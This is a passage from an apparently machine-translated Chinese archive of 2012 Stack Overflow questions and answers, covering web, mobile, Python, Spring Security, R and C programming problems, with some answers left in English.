    var data = [ {id:1, p:26}, {id:2, p:99} ];
    for(var i = 0; i < data.length; i++) {
        $('#p-' + data[i].id).html(data[i].p + '% complete');            
    }
    ResetUpdate();
}

function ResetUpdate() {
    to = setTimeout("Update()", 120000); //2 minutes
} 
```

[这是 jsFiddle](http://jsfiddle.net/SgaSA/3/)。

# actionscript-3 - Starlingpunk 框架目前的价值如何？准备好迎接黄金时段了吗？

> ID：12078371
> 
> 赞同：3
> 
> 时间：2012-08-22T17:28:37.900
> 
> 标签：actionscript-3, flash, actionscript, 2d-games

你们有没有人尝试过使用 Starlingpunk 框架的 Flash？这似乎好得令人难以置信，我想知道你们中是否有人能说出它与 Flashpunk、性能、工作流程或限制的不同之处。感谢您提供的任何见解。

[http://www.andysaia.com/radicalpropositions/starlingpunk/](http://www.andysaia.com/radicalpropositions/starlingpunk/)

# c# - 如何设置应用程序磁贴的初始值

> ID：12078372
> 
> 赞同：0
> 
> 时间：2012-08-22T17:28:43.990
> 
> 标签：c#, windows-phone-7, live-tile

我希望我的应用程序磁贴具有翻转动画，并且我试图在我的 MainPage 的代码隐藏中设置这些值，但由于某种原因，应用程序磁贴不执行翻转动画。我相信我正确设置了背面值。我所拥有的如下：

MainPage.xaml.cs

```
public void CreateApplicationTile()
    {
        var appTile = ShellTile.ActiveTiles.First();

        if (appTile != null)
        {
            var standardTile = new StandardTileData
            {
                Title = "ShareSky",
                BackgroundImage = new Uri("/Background.png", UriKind.Relative),
                BackTitle = "ShareSky",
                BackBackgroundImage = new Uri("/Background.png", UriKind.Relative),
                //BackContent = "click me!"                    
                BackContent = AppResource.Main_MainPage_ApplicationTile_BackContent
            };

            appTile.Update(standardTile);
        }
    } 
```

据我了解，此方法不需要与任何类型的任何事件（例如单击）相关联即可使其工作。我不确定我在这里做错了什么？如果我必须编辑 WMAppManifest 文件，我将如何正确地执行此操作以合并磁贴信息的背面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T19:11:04.427

愚蠢的问题，但您实际上是在构造函数中调用“CreateApplicationTile”吗？如果你不这样做，它永远不会激活。

```
 public MainPage()
    {
        InitializeComponent();
        CreateApplicationTile();
    } 
```

我跑了以下，得到了愉快的翻车。

```
 var appTile = ShellTile.ActiveTiles.FirstOrDefault(x => x.NavigationUri.ToString() == "/");
   if (appTile != null)
   {
        var standardTile = new StandardTileData
        {
                Title = "ShareSky",
                BackgroundImage = new Uri("/Background.png", UriKind.RelativeOrAbsolute),
                BackTitle = "ShareSky",
                BackBackgroundImage = new Uri("/flipped.png", UriKind.RelativeOrAbsolute),
                BackContent = "backcontent load"
        };

        appTile.Update(standardTile);
     } 
```

# ios - Xcode 恢复快照什么都不做

> ID：12078373
> 
> 赞同：2
> 
> 时间：2012-08-22T17:28:52.790
> 
> 标签：ios, xcode, snapshot

我尝试恢复快照，看起来他们确实将我的旧代码存储在那里，但是当我单击恢复时，没有任何变化。

我正在运行最新版本的 Xcode，但没有发生任何事情。

有谁知道为什么？

# python - 部分更新 App Engine 实体

> ID：12078376
> 
> 赞同：0
> 
> 时间：2012-08-22T17:29:04.273
> 
> 标签：python, google-app-engine, google-cloud-datastore, app-engine-ndb

我正在使用 App Engine 构建一个同步引擎，当我从客户端接收数据时，我想存储一个对象，但我不在乎它是否已经存在。如果我在更新时总是从客户端发送所有属性，那么今天效果很好。但我想要...

*   客户端不知道的一些内部属性在更新后仍然存在
*   客户端只能发送更改的值
*   避免在更新之前获取所有对象，因为可能需要更新的对象很少

**我是否需要获取每个对象，然后只更新我想要更改的值，然后更新对象？或者是否可以部分更新实体而不获取它们？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T20:28:22.547

不，您不能在不先读取对象的情况下更新它。当您用新数据“覆盖”一个对象时，该对象的新版本将*仅*包含显式写入的数据。

您可能应该制作一个允许客户端设置的属性列表，并仅使用客户端发送且在白名单中的那些属性值更新对象（在读取之后）。

例如（使用 NDB 语法）：

```
whitelist = ['prop1', 'prop2', ...]

def update_entity(key, **changed_values):
  ent = key.get()
  for name, value in changed_values.items():
    if name in whitelist:
      setattr(ent, name, value)  # Or ent._properties[name]._set_value(ent, value)
  ent.put() 
```

# python - 评估生成器表达式后文件被关闭

> ID：12078377
> 
> 赞同：0
> 
> 时间：2012-08-22T17:29:12.853
> 
> 标签：python, generator

假设我有一个文件`test.txt`并且想要打印内容。我可以在 Python 中这样做（这只是说明我的问题的示例，而不是好的代码示例）：

```
for i in (line for line in open('test.txt')):
    print ">", i, 
```

我曾经`strace`确保在代码执行后打开和关闭文件。

问题：为什么文件被关闭？我想这与上下文管理器有关，但我找不到对这种结构的任何引用以及文件自动关闭的原因。谁知道幕后究竟发生了什么并能解释一下？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T17:31:11.347

当对文件的引用超出范围时，它会被垃圾收集，并作为被删除的一部分关闭。由于您没有为文件分配名称，因此循环结束后，它就会超出范围。然而，这并不是一件值得依赖的好事情。请改用实际的上下文管理器，例如：

```
with open('test.txt') as f:
    for i in f:
        print(">", i, end="") 
```

还值得注意的是你的生成器表达式在这里什么都不做，所以我把它删除了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:33:24.900

看到[这个答案](https://stackoverflow.com/questions/1834556/does-a-file-object-automatically-close-when-its-reference-count-hits-zero)。您不保留对文件对象的引用，因此在循环运行后它没有对它的引用。然后它被垃圾收集，当这种情况发生时，文件被关闭。但是，不能保证它会在循环后立即被垃圾收集。在 Python 注意到它没有被使用之前，它可能会存在一段时间。因此，最好显式关闭文件，或者甚至更好地使用`with`块，以便为您关闭它。

# codeigniter - Codeigniter- 加载模型 w/ 构造和传递的 var

> ID：12078379
> 
> 赞同：0
> 
> 时间：2012-08-22T17:29:14.213
> 
> 标签：codeigniter, model, constructor

所以这就是我所拥有的......

类 User_Data 扩展 CI_Model{

```
var $id,
    $first_name,
    $last_name,
    $name;

public function __construct($init_data) {
    parent::__construct();

    if(isset($init_data))
    {
     ...
    } 
```

我的问题是，当我将模型加载到控制器中时，它会出现错误：

> 消息：缺少 User_Data::__construct() 的参数 1

但即使加载时出现错误，它也会在我创建新实例时完成我想要的操作。

如果有人能引导我朝着正确的方向前进，那就太棒了。

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:48:59.387

删除参数或设置默认值：

```
public function __construct($init_data = 0) 
```

# python - 当模型的属性是巨大的文本时

> ID：12078386
> 
> 赞同：0
> 
> 时间：2012-08-22T17:29:28.227
> 
> 标签：python, database, django-models, modeling, large-data

如果应用程序中的模型具有非常大（大小）的文本属性，甚至长文本也无法包含它，一种可能的存储方式似乎是将其存储在文本文件中，并将文本位置用作数据库。但是，我不确定使用这种策略来命名该属性是否合适？

例如假设我们有：

```
class Novel(models.Model):
    ???? = models.CharField(max_length=200) 
```

我应该将此属性命名为 novel_text 还是 Novel_text_path？这是存储大量文本的正确方法吗？

我希望这看起来不是一个愚蠢的问题。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T17:33:14.883

你试过 Django 的[TextField](https://docs.djangoproject.com/en/1.4/ref/models/fields/#textfield)吗？它适用于您必须存储长文本的情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T20:10:44.663

如果您想将此文本存储在单独的文件中，我建议将其命名为 novel_text_file 或类似名称，以使其尽可能清晰和合乎逻辑，正如 Pratik 所写，我将使用 Django 的文件字段。

但我不认为这是存储此类数据的最佳解决方案。想象一下，如果您需要扩展您的系统。将数据存储在文件中使其变得更加困难。您必须将文件同步到所有服务器或共享它们。

一种可能的解决方案是使用 MongoDB 的 GridFS。这可能有用：[http ://django-mongodb.org/topics/gridfs.html](http://django-mongodb.org/topics/gridfs.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:39:13.720

您应该将其命名为类似于，`file_path`因为它就是这样。也使用[Django Model FileField](https://docs.djangoproject.com/en/dev/ref/models/fields/#filefield)

# objective-c - NSTextView 或 NSTextField 自动调整边界/框架的大小？

> ID：12078390
> 
> 赞同：0
> 
> 时间：2012-08-22T17:29:38.097
> 
> 标签：objective-c, macos, nstableview, nstextfield, nstextview

我正在尝试使用 NSTextView 或 NSTextField 来显示我通过添加的文本`textField.stringValue = [dictionary objectForKey:@"info"];`

问题是我需要文本区域的边界/框架垂直调整大小以显示所有文本。文本从几个单词（1 行）到一两个段落不等。

当我尝试`[textField sizeToFit];`

它将整个事情重新调整为一条太长的单行（并且消失了）。我需要它根据当前窗口宽度自动重新调整其宽度，并根据该重新调整其高度来继续显示所有文本。

关于尝试什么或方向的任何想法？这适用于没有 iOS 的 OSX。

*（此 TextField 或 TextView 将进入**基于视图**- NSTableView。所以我最终试图让我的表格根据该文本框动态调整其行高。）*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:37:11.657

I needed to do something similar to this on my current project. The trick is to use the `sizeWithFont` method on `NSString`. This will return a `CGSize` which you can then use to build a correctly sized frame to fit your text.

```
-(void) setCaption: (NSString*) text size:(CGSize) maxSize
{
    [self.label setText:text];
    UIFont* font=[UIFont systemFontOfSize: [UIFont systemFontSize]]
    [[self label] setFont:font];

    CGSize size=[text sizeWithFont:font constrainedToSize:maxSize];  
    label.frame = CGRectMake(0, 0, size.width, size.height);
} 
```

If you don't have access to the view, then you could roll this up into a Class helper method.

# android - 带有溢出的 DIV 不会在 Android 设备上滚动

> ID：12078392
> 
> 赞同：0
> 
> 时间：2012-08-22T17:29:42.830
> 
> 标签：android, html, css, overflow

自动和滚动似乎可以很好地处理我在 iPhone 上的 DIV 上的溢出，但它们似乎在任何 Android 设备上都不起作用，以前有没有人遇到过这样的事情？

[编辑于 2012 年 8 月 22 日 14:02]

这似乎是Android浏览器的一个错误，有人知道任何修复或解决方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:44:49.457

这是 Android 的一个错误。

[http://code.google.com/p/android/issues/detail?id=2911](http://code.google.com/p/android/issues/detail?id=2911)

# php - 在服务器上运行时找不到 mysqli

> ID：12078394
> 
> 赞同：2
> 
> 时间：2012-08-22T17:29:54.453
> 
> 标签：php, mysql, heroku

当我在本地主机上运行我的应用程序时，我没有任何问题，但是当它在 heroku 上运行时，我收到此错误：致命错误：第 13 行的 /app/www/db.php 中找不到类 'mysqli'

我运行了这段代码来检查它：

```
if (!function_exists('mysqli_init') && !extension_loaded('mysqli')) {

    echo 'We don\'t have mysqli!!!';

} else {

    echo 'Phew we have it!';

} 
```

当我在 localhost 上运行它时，我得到“Phew we have it！” 但是当我在heroku上运行它时，我得到“我们没有mysqli！！！”。我不知道问题是什么，所以任何帮助都会很棒。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:35:39.777

According to a [blogger in 2011](http://dracossoftware.blogspot.com/2011/10/bye-bye-heroku-phpfog-phail-hello-my.html), heroku does not support the `mysqli` class. It does [support postgres](http://postgres.heroku.com/), but I am not sure if the PHP installation includes support for postgres. [This blogger](http://log.demaree.me/post/14996591419/heroku-supports-php-yay-yes-yay) indicates that it does.

Someone more familiar with heroku could possibly give you a better answer.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T01:39:04.713

[Heroku 上的 PHP 再次](http://hakre.wordpress.com/2012/05/20/php-on-heroku-again/)引导您了解如何自定义 Heroku 的默认 PHP 设置，包括安装其他模块。

有一个[github 存储库](https://github.com/wuputah/heroku-libraries/tree/master/php)，其中包含一些已经编译和发布的模块，包括 MySQLi。

# html - 为什么标签之间的代码添加到标签

> ID：12078395
> 
> 赞同：1
> 
> 时间：2012-08-22T17:29:55.880
> 
> 标签：html, css

我有一个简单的 html 代码如下[HTML CODE](http://pastebin.com/UEuNfCPg)

问题是，如果将代码打印到浏览器中，则`<head>`标签内的内容会打印在`<body>`标签开头的标签内，我肯定知道这是一个未正确关闭的标签，但我看不到任何错误。我想有人会在我的代码中看到编码错误！提前感谢我得到的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:37:51.507

`<!DOCTYPE`需要成为页面上的第一件事。失去它之前的所有空白。

您的 pastebin 中的文件以： 开头`0D 0A EF BB BF`。如果您无法读取十六进制，那是`\r\n`（新行）后跟 UTF-8 字节顺序标记。

# java - 使用 DownloadManager 类从 WebView 下载文件

> ID：12078401
> 
> 赞同：3
> 
> 时间：2012-08-22T17:30:23.257
> 
> 标签：java, android, android-intent, webview

当单击 webview 上的链接时，我在这里有这个小代码，该链接是文件的链接，在本例中为 .mp4。此代码将转到默认 Web 浏览器并请求可以查看此文件类型的应用程序。

```
myWebView.setDownloadListener(new DownloadListener() {
    public void onDownloadStart(String url, String userAgent,
        String contentDisposition, String mimetype,
        long contentLength) {
      Intent i = new Intent(Intent.ACTION_VIEW);
      i.setData(Uri.parse(url));
      startActivity(i);
    }
}); 
```

我想要的是当我单击该文件链接时，它会创建一个对话框，询问天气以下载或查看文件。如果单击下载，我想使用 DownloadManager 类来处理它并在后台下载该文件并在完成时发出警报。如果单击查看，我想创建意图，要求应用程序可以查看此文件而无需访问网络浏览器。

```
 private class MyWebViewClient extends WebViewClient {

    @Override
    public boolean shouldOverrideUrlLoading(WebView view, final String url) {

        if (url.endsWith(".mp4")) {
            AlertDialog.Builder builder = new AlertDialog.Builder(context);
            builder.setMessage(R.string.dialog_title)
                .setCancelable(false)
                .setPositiveButton(R.string.dialog_download, new DialogInterface.OnClickListener() {                        

                    public void onClick(DialogInterface dialog, int id) {
                                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                                request.setDescription("Some descrition");
                                request.setTitle("Some title");
                                // in order for this if to run, you must use the android 3.2 to compile your app
                                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "name-of-the-file.ext");

                                // get download service and enqueue file
                                DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
                                manager.enqueue(request);
                    }
                })
                .setNegativeButton(R.string.dialog_play, new DialogInterface.OnClickListener() {

                    public void onClick(DialogInterface dialog, int id) {
                        WebView myWebView = (WebView) findViewById(R.id.webview);                           
                        myWebView.setDownloadListener(new DownloadListener() {
                            public void onDownloadStart(String url, String userAgent,
                                    String contentDisposition, String mimetype,
                                    long contentLength) {
                                Intent intent = new Intent();
                                intent.setAction(Intent.ACTION_VIEW);
                                intent.setDataAndType(Uri.parse(url), "video/mp4");
                                startActivity(intent);
                            }
                        });

                    }
                });
            AlertDialog alert = builder.create();
            alert.show();
        }
        return false;
    }
} 
```

现在我得到了提示用户下载或播放用户单击的 mp4 文件的代码。但是当我点击播放或下载时，它一直有效，直到我第二次点击链接，如果有人可以纠正这个问题，上面的代码有什么问题。谢谢。

我对 Android 开发和 Java 非常陌生，如果有人能指导我完成这件事，它将帮助我更快地学习。也对不起我的英语...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:07:48.573

您的问题的解决方案依赖于拦截您的 webview 尝试加载的 URL。创建一个[WebViewClient](http://developer.android.com/reference/android/webkit/WebViewClient.html)并覆盖 shouldOverrideUrlLoading 方法：

```
public boolean shouldOverrideUrlLoading(WebView view, String url) {
    if (url.endsWith(".mp3")) { //or whatever other extension
      //Prompt user for action (save or view)
    }
    return false;
 } 
```

然后，根据用户的选择，启动[AsyncTask 进行下载](https://stackoverflow.com/questions/3028306/download-a-file-with-android-and-showing-the-progress-in-a-progressdialog)以处理文件下载，或启动 Intent 进行查看。

# spring-security - org.springframework.security.core.userdetails.User 无法转换为 MyUser

> ID：12078404
> 
> 赞同：4
> 
> 时间：2012-08-22T17:30:34.247
> 
> 标签：spring-security

这是一个春季安全问题。

我希望能够使用检索我的自定义用户对象对象

```
SecurityContextHolder.getContext().getAuthentication().getPrincipal(); 
```

因为我需要其他详细信息，例如用户 ID 和其他内容，以便在我的课程中实现进一步的业务逻辑。

为此，我有一个从 org.springframework.security.core.userdetails.jdbc.JdbcDaoImpl 派生的自定义类，我在其中覆盖了 loadUsersByUsername() 以填充其他用户字段并返回 MyUser 的对象，其中包含用户 ID 等额外字段.

代码 -

```
public class MyJdbcDaoImpl extends JdbcDaoImpl {

@Override
protected List<UserDetails> loadUsersByUsername(String username) {
    return getJdbcTemplate().query(getUsersByUsernameQuery(), new String[] {username}, new RowMapper<UserDetails>() {
        public UserDetails mapRow(ResultSet rs, int rowNum) throws SQLException {
            Long id = rs.getLong(1);
            String username = rs.getString(2);
            String password = rs.getString(3);
            boolean enabled = rs.getBoolean(4);
            MyUser user = new MyUser(username, password, enabled, true, true, true, AuthorityUtils.NO_AUTHORITIES);
            user.setId(id);
            return user;
        }

    });
}
} 
```

我的应用程序上下文 -

```
<beans:bean id="myJdbcDaoImpl" class="package.MyJdbcDaoImpl">
        <beans:property name="dataSource" ref="securityDB"/>
        <beans:property name="authoritiesByUsernameQuery" value="select username,role_id from app_user,user_role where app_user.id = user_role.user_id and username=?"/>
        <beans:property name="usersByUsernameQuery" value="select id,username,password,account_enabled from app_user where username = ?"/>
</beans:bean>

<authentication-manager alias="authenticationManager">
<authentication-provider user-service-ref="myJdbcDaoImpl">
       <password-encoder hash="sha"/>
</authentication-provider> 
```

问题是，当我做一个

```
MyUser user = (MyUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal(); 
```

我得到一个异常 java.lang.ClassCastException: org.springframework.security.core.userdetails.User cannot be cast to package.MyUser

我应该怎么做才能使用来自 SecurityContextHolder 的附加字段访问我的用户对象？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T21:24:26.250

您覆盖了错误的方法，另外覆盖`createUserDetails`了从这些通过以下方式获取的最终用户对象`loadUsersByUsername`：

```
@Override
protected UserDetails createUserDetails(final String username,
    final UserDetails userFromUserQuery,
    final List<GrantedAuthority> combinedAuthorities) {
  String returnUsername = userFromUserQuery.getUsername();

  if (!isUsernameBasedPrimaryKey()) {
    returnUsername = username;
  }

  final MyUser userToReturn = new MyUser(returnUsername,
      userFromUserQuery.getPassword(), userFromUserQuery.isEnabled(), true,
      true, true, combinedAuthorities);
  userToReturn.setId(((MyUser) userFromUserQuery).getId());
  return userToReturn;
} 
```

`userToReturn.setId(((MyUser) userFromUserQuery).getId());`如果您使用您的代码将起作用，或者您可以在文档中删除`loadUsersByUsername`并获取 id ：`createUserDetails`

> 可以重写以自定义由 loadUserByUsername 方法返回的最终 UserDetailsObject 的创建。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T21:23:04.833

回答我自己的问题-

问题不是从 JdbcDaoImpl 覆盖 loadUserByUsername(String username)。

因此，JdbcDaoImpl 的 loadUserByUsername(String username) 实现被调用，虽然内部首先调用 loadUsersByUsername(String username)，但随后将授予权限添加到上面返回的 MyUser 对象并将其作为 org.springframework.security.core.userdetails 返回.用户对象。

# ajax - 向此脚本添加 AJAX 回调函数

> ID：12078406
> 
> 赞同：0
> 
> 时间：2012-08-22T17:30:35.223
> 
> 标签：ajax

如何向此脚本添加 AJAX 回调函数？

此脚本正在使用 AJAX 加载内容而不刷新页面，但它没有加载脚本。我想如果我添加一个回调函数，脚本就会加载。

```
$(document).ready(function () {

    var hash = window.location.hash.substr(1);
    var href = $('#nav li a').each(function () {
        var href = $(this).attr('href');
        if (hash == href.substr(0, href.length - 5)) {
            var toLoad = hash + '.php #conten';
            $('#conten').load(toLoad)
        }
    });

    $('#nav li a').click(function () {

        var toLoad = $(this).attr('href') + ' #conten';
        $('#conten').hide('fast', loadContent);
        $('#load').remove();
        $('#conten').append('<span id="load"></span>');
        $('#load').fadeIn('normal');
        window.location.hash = $(this).attr('href').substr(0, $(this).attr('href').length - 5);

        function loadContent() {
            $('#conten').load(toLoad, '', showNewContent)
        }

        function showNewContent() {
            $('#conten').show('normal', hideLoader());
        }

        function hideLoader() {
            $('#load').fadeOut('normal');
        }

        return false;
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:23:08.903

如果我理解正确，核心问题是 load() 不起作用。这可能是因为您的网址有一个井号标签，前面有一个空格：“url #conten”。

首先，哈希必须连接到 url：“url#conten”。其次，url中的哈希值被服务器忽略；它们仅由客户端（浏览器）解释。

如果这没有帮助，我建议在浏览器中使用调试工具来查看服务器的响应是什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:40:03.780

[http://api.jquery.com/load/](http://api.jquery.com/load/)

要加载的第二个参数可以是回调，如果您还向服务器传递数据，则可以是第三个：

```
$('#element').load(url, function() { console.log('content loaded'); });
$('#element').load(url, {some: 'parameters'}, function() { console.log('content loaded'); }); 
```

在不知道页面布局和请求页面的通用示例的情况下，很难猜测会发生什么，但是：

1.  您指定“#conten”中的内容应取自请求的页面并放入当前页面的“#conten”中——两个页面上都定义了“#conten”吗？

2.  您是否尝试设置断点以确认正在调用负载/您是否检查过请求已发送并验证其内容？

3.  您已经在父范围和子范围中定义了 href ——虽然它们看起来没有混淆，但唯一的变量名将减少它们混淆的机会并使代码更易于阅读。

如果这些都没有帮助，您是否有一个 HTML 示例来演示您可以提供的问题？

# javascript - 制作 SEO 友好的表单

> ID：12078409
> 
> 赞同：0
> 
> 时间：2012-08-22T17:30:53.043
> 
> 标签：javascript, jquery, forms, html, seo

我想知道是否可以在不使用 JS 或者以搜索引擎友好的方式更改表单提交数据的方式

我有两种不同的非常基本的形式。第一个包含一个下拉菜单，允许您选择一个主题。另一个用途完全相同，它只允许您在文本框中键入主题（并使用自动完成），而不是从长列表中选择它。

目前，两种表单都以 GET 方法提交数据，因此相同选择的基本提交将导致以下 URL：

[http://example.com/subject/?text=XXXXXX](http://example.com/subject/?text=XXXXXX)

（我正在使用 .htaccess 将 /subject 重写为实际的 php 脚本......）

我想要做的实际上是让 URL 看起来像这样：

[http://example.com/subject/XXXXXX](http://example.com/subject/XXXXXX)

目前我的 .htaccess 将毫无问题地识别这两个 URL，我只是想知道是否有一种方法可以使用没有 JS 或任何 SE 友好方法的第二种方法提交表单

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:47:12.523

为了发送表单，所有 http 客户端（浏览器和 SE，虽然我不知道 SE 是否填写和发送表单）将构建名称=值对。您可以通过触摸表单的 action 属性来更改它（并且可能在发送之前删除变量），但这当然需要 Javascript。

没有 JS，您将无法更改它，因为这就是必须发送表单的方式。

如果您想索引搜索引擎友好的 URL，我认为您最好的选择是使用 .htaccess 指令进行重定向，但这只能在您收到参数化 URL 后发生。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-05T11:41:59.333

您可以列出所有 url 的选项，如果 js 被禁用（SE），您将显示此列表（并隐藏表单）。如果启用了 js，则显示表单。

您可以在 css 中隐藏表单并使用 js 将其设置为可见。或者使用js生成整个表单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-05T11:35:31.970

搜索引擎蜘蛛不会提交表单。您必须将列表中您想要的项目放在蜘蛛可以找到它们的页面中的其他位置 - 例如在组合框上方的段落中。您可以将它们放在元描述或关键字标签中，但前提是它们实际上很重要 - 如果谷歌决定您试图在页面中进行过多的优化，它将惩罚您的排名。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-21T12:51:13.780

根据我的经验，最优化的解决方案是添加一个固定 URL 格式的小解析器脚本，并对新链接进行 302 重定向。

换句话说，假设表单提交了以下链接：

```
http://example.com/subject/?text=XXXXXX 
```

PHP 脚本将接收链接，将部分：?text=XXXXXX 替换为 XXXXXX，并将用户重定向到新页面。

该解决方案将为我们节省 .htaccess 的复杂性，并让我们在未来维护表单时更加灵活。

# r - 从 R 中的 Twitter 状态中提取用户

> ID：12078410
> 
> 赞同：3
> 
> 时间：2012-08-22T17:31:05.397
> 
> 标签：r, twitter

我试图找出特定用户向/提及另一个用户的推文频率。通过 twitteR-package 我可以检索给定用户的推文，但是如果一条推文提到了几个用户，那么在 replyToUID 字段中只提到第一个用户。所以我的数据框的第一列包含推文，例如：

“@user1 @user2 你读过@user3 写的东西吗？”

我想将用户名提取到这样的列表中

*   用户1
*   用户2
*   用户3

下一条推文中的用户将在下面添加。如果有人知道该怎么做（提取，我可以处理循环）或将我指向正确的方向，那将非常感激。

可选地，对于真正有用的，如果您知道如何组合最终的列表（在处理 n 条推文之后），而不是

*   用户1
*   用户2
*   用户3
*   用户1
*   用户3
*   用户4

列表（或表）如下所示（计算某个用户被提及的频率）

*   用户 1, 2
*   用户 2, 1
*   用户 3, 2
*   用户 4, 1

它会更加赞赏。

谢谢你，埃利亚斯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T18:43:37.787

我不确定有效 twitter 用户名的规则是什么，但假设只允许使用字母数字字符，您可以使用简单的正则表达式来做到这一点：

```
x <- "@user1 @user2 have you read what @user3 wrote?"

users <- function(x){
  xx <- strsplit(x, " ")
  lapply(xx, function(xx)xx[grepl("@[[:alnum:]]", xx)])
}

users(x)
[[1]]
[1] "@user1" "@user2" "@user3" 
```

* * *

此外，该解决方案还假设所有单词都用空格分隔，即它不适用于用户名后跟标点符号。您必须扩展此答案以应对这种情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T04:25:00.027

您不久前发布了此内容，但我只是在寻找另一个问题的答案时遇到了它。

我只是想把这个关于“推特实体”的说明页面指向你。 [https://dev.twitter.com/docs/tweet-entities](https://dev.twitter.com/docs/tweet-entities)

有一个“user_mention 实体”可以提取推文文本中的所有推特用户名，并为您提供一个数组。我认为这应该使您可以访问您想要获得的内容。

# c - C malloc 在调试/发布时的奇怪行为

> ID：12078417
> 
> 赞同：1
> 
> 时间：2012-08-22T17:31:22.913
> 
> 标签：c, debugging, gcc, malloc

我正在尝试在简单程序中使用 C malloc/free 函数。

```
void* alloc_array( const int size )
{
    void* p;

    p = malloc( size );
    if( p )
    {
        //memset(p, 0, size);
        return( p );
    }
    else
        return NULL;
}

void free_array( void* p )
{
    if( p )
    {
        free( p );
        p = NULL;
    }       
}

void** alloc_array_ptr( const int nPointers )
{
    void** p;   
    unsigned int size = AMOUNT_TO_ALLOC(nPointers, void*);

    p = malloc( size );
    if( p )
    {
        return( p );
    }
    else
        return( NULL );
}

void free_array_ptr( void** p, const int nPointers )
{
    unsigned int i;

    if( p )
    {
        for( i = 0; i < nPointers; i++ )
            if( p[i] )
            {
                free( p[i] );
                p[i] = NULL;
            }

        free(p);
        p = NULL;
    }
}
int main(int argc, char* agv[]) {
    // builds the string with the location of the ini file
    int inifile_size = 0;
    char* inifile;
    // gets the buffer size nedeed for the buffer
    inifile_size = GetCurrentDirectory(0, NULL);
    // allocates memory for the buffer
    inifile = (char*) alloc_array( AMOUNT_TO_ALLOC(inifile_size, char) );
    // fills the buffer with the current directory
    if( GetCurrentDirectory( inifile_size, inifile ) == 0 )
    {
        printf("GetCurrentDirectory failed! (ErrorCode: %u)\n", GetLastError());
        return( !MY_ERROR_OK );
    }
    strcat(inifile, "\\");
    strcat(inifile, "test.ini");    
    printf("INI File: %s\n", inifile);

    char** sessions;
    int nSessions = 0;
    int i;

    nSessions = getNumberOfSubkeys(str);
    printf("\nOK (%d sessions found)\n", nSessions);

    // allocating memory for the sessions array of char*
    sessions = (char**) alloc_array_ptr( nSessions );

    if( sessions == NULL )
    {
        printf("ERROR_IN_MEM_ALLOC (SESSIONS)\n");      
        return( MY_ERROR_MEM_ALLOC );
    }
    else
        printf("sessions: 0x%p\n", sessions);

    // allocating memory for each one of the char* in sessions
    for( i = 0; i < nSessions; i++ )
    {
        sessions[i] = (char*) alloc_array( AMOUNT_TO_ALLOC(MAX_KEY_LENGTH, char) );

        printf("sessions[%d]: 0x%p\n", i, sessions[i]);

        if( sessions[i] == NULL )
        {
            printf("ERROR_IN_MEM_ALLOC (SESSIONS[%d])\n", i);
            return( MY_ERROR_MEM_ALLOC );                   
        }
    }

    printf("\nSessions found:\n");

    if( readSubkeys( str, sessions ) == MY_ERROR_OK )
    {
        for( i = 0; i < nSessions; i++ )
        {
            printf("\t%s: ", sessions[i]);

            if( convert2ini(inifile, sessions[i]) == MY_ERROR_OK )
                printf("OK\n");
            else
            {
                printf("ERROR\n");
                return( !MY_ERROR_OK );
            }           
        }
    }
    else
    {
        printf("ERROR\n");
        return( MY_ERROR_OPEN_REGISTRY );   
    }

    // free the inifile array
    free_array(inifile);

    // free the array of char*
    free_array_ptr( (void**)sessions, nSessions );      

    // returns to OS
    return( MY_ERROR_OK ); 
} 
```

这是一个小工具，可以将 Windows 注册表中的一些程序设置转换为 ini 文件（Windows7、64 位、4Gb RAM）。

readSubkeys 用它从 str 中的注册表项获取的会话名称填充 char* 的预分配会话数组

getNumberOfSubkeys 返回注册表中给定的子键数

其余代码与此无关。问题是，当我在 for 循环内为每个 char* 分配内存时，malloc 失败。我正在使用 CodeLite 编写这个程序，奇怪的是，当我逐步调试代码时，malloc 并没有失败。

运行此程序的图像在这里。 ![跑步](../Images/a6a74395de39ccdfa724ac2b06aaff93.png)

有人可以请给我一些建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:36:40.687

> 奇怪的是，当我逐步调试代码时，malloc 并没有失败。

该语句可能意味着您的代码中的其他地方存在内存分配错误，导致该块（例如 malloc() 调用或断言）失败。如果没有更多代码，我们真的没有足够的信息来完全调试它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T19:08:31.707

